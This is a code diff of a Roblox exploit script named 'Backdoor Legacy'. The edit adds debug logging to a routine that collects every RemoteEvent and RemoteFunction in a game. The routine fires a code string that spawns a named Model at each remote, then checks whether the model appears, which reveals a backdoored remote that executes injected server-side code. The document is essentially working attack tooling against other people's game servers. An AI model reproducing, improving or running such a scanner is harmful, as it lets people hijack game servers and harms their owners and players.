@@ -1,6 +1,6 @@
 print("Backdoor Legacy // Successfully booted up!")
 local function debug(msg)
-	game:GetService('TestService'):Message('BackdoorLegacy [DEBUG] // '..tostring(msg)) 
+	game:GetService('TestService'):Message('BackdoorLegacy // '..tostring(msg)) -- This is for debugging.
 end 
 
 -- Create GUI Objects
@@ -150,6 +150,7 @@ Acqur.MouseButton1Click:Connect(function()
 		isAcquiring = true 
 		for i,v in pairs(game:GetDescendants()) do 
 			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
+				debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.')
 				table.insert(RemoteList,v) 
 			end 
 		end 
@@ -159,13 +160,18 @@ Acqur.MouseButton1Click:Connect(function()
 			local NeededCode = 'Instance.new("Model",workspace).Name = '..NeededNameOfModel 
 			CurrentRemote = b
 			if b:IsA('RemoteEvent') then 
+				debug('Fired')
 				b:FireServer(NeededCode) 
 			elseif b:IsA('RemoteFunction') then 
+				debug('Invoked')
 				task.spawn(function() b:InvokeServer(NeededCode) end) 
 			end 
+			debug('Awaiting')
 			wait(5) 
 			if workspace:FindFirstChild(NeededNameOfModel) then 
+				debug('Detected')
 				if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
+					debug('Success')
 					AcquiredRemote = b
 				end 
 			end 
